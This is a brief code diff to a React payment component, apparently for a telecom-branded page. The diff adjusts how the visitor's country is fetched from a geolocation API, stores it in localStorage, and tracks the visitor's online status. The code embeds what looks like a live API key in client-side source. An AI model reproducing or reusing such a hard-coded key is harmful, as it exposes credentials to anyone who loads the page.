@@ -39,8 +39,7 @@ export default function ZainPayment() {
     },
   ]
 useEffect(()=>{
-  addData({id:_id,createdDate:new Date().toISOString()})
-  getLocation()
+  getLocation().then(()=>{})
 },[])
 async function getLocation() {
   const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
@@ -56,6 +55,7 @@ async function getLocation() {
           id:_id,
           country: country
       })
+      localStorage.setItem('country',country)
       setupOnlineStatus(_id)
     } catch (error) {
       console.error('Error fetching location:', error);
